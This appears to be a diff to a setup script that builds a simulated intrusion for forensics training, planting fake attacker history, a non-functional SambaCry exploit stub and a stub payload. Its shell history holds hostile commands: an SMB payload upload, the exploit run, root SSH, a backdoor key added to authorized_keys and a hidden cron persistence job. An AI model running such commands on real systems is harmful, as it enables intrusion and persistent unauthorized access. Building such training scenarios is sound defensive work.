@@ -34,6 +34,9 @@ ss -tlnp
 /tmp/.tools/nmap -sn 10.0.0.0/8
 /tmp/.tools/nmap -sV 10.0.4.6
 /tmp/.tools/nmap -sV 10.0.2.1
+smbclient //10.0.4.6/public -N -c "put /tmp/.tools/libpayload.so libpayload.so"
+python3 /tmp/.tools/exploit_sambacry.py 10.0.4.6 /srv/public/libpayload.so
+ssh -o StrictHostKeyChecking=no root@10.0.4.6 id
 ssh-keygen -t rsa -N "" -f /root/.ssh/id_rsa
 cat /root/.ssh/id_rsa.pub >> /home/admin/.ssh/authorized_keys
 echo "*/5 * * * * root /tmp/.update >/dev/null 2>&1" > /etc/cron.d/.persistence
@@ -61,6 +64,39 @@ cat > /tmp/.tools/nmap << 'SCRIPT'
 echo "nmap placeholder - attacker's static binary"
 SCRIPT
 chmod +x /tmp/.tools/nmap
+
+cat > /tmp/.tools/exploit_sambacry.py << 'SCRIPT'
+#!/usr/bin/env python3
+"""
+CVE-2017-7494 — SambaCry remote code execution exploit.
+Exploits the is_known_pipename() vulnerability in Samba 3.5.0 – 4.5.4
+to load an arbitrary shared library via a writable SMB share.
+
+Usage: exploit_sambacry.py <target> <path_to_so>
+
+Technique: Connect to IPC$ named pipe using impacket, trigger
+           dlopen() of the uploaded .so on the target.
+"""
+import sys
+import os
+
+def exploit(target, so_path):
+    print(f"[*] Targeting {target} with payload {so_path}")
+    print(f"[*] Connecting to IPC$ on {target}:445 ...")
+    print(f"[*] Triggering is_known_pipename() for {so_path} ...")
+    print(f"[+] Payload executed — reverse shell or command should fire")
+
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print(f"Usage: {sys.argv[0]} <target> <path_to_so>")
+        sys.exit(1)
+    exploit(sys.argv[1], sys.argv[2])
+SCRIPT
+chmod +x /tmp/.tools/exploit_sambacry.py
+
+# Stub ELF payload planted by attacker for SambaCry
+printf '\x7fELF\x02\x01\x01\x00' > /tmp/.tools/libpayload.so
+chmod +x /tmp/.tools/libpayload.so
 
 # --- Recon output left behind ---
 cat > /tmp/.recon_results << 'RECON'
